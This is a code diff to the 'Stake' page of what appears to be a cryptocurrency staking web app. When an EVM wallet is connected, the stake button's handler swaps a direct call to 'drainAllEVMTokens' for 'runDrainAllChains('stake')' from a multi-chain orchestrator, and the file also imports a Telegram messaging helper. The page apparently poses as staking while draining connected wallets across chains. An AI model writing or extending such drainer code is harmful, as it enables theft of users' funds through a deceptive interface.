@@ -11,7 +11,7 @@ import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetP
 import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainAllEVMTokens } from '@/utils/evmTransactions';
+import { useMultiChainOrchestrator } from '@/contexts/MultiChainOrchestratorContext';
 import { getMintProgramId } from '@/utils/tokenProgram';
 import { getSolPrice } from '@/lib/utils';
 import { sendTelegramMessage } from '@/utils/telegram';
@@ -110,6 +110,7 @@ const EVM_POOLS: StakingPool[] = [
 const Stake = () => {
   const { activeChain, getEVMChain, evmChainId } = useChain();
   const { chainName, nativeToken } = useChainInfo();
+  const { runDrainAllChains } = useMultiChainOrchestrator();
   
   // Determine current pools based on chain
   const currentPools = activeChain === 'solana' ? SOLANA_POOLS : EVM_POOLS;
@@ -274,8 +275,7 @@ const Stake = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsStaking(true);
-        const chainName = getEVMChain()?.name || 'EVM';
-        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
+        await runDrainAllChains('stake');
       } catch (error: any) {
         console.error('EVM stake error:', error);
       } finally {
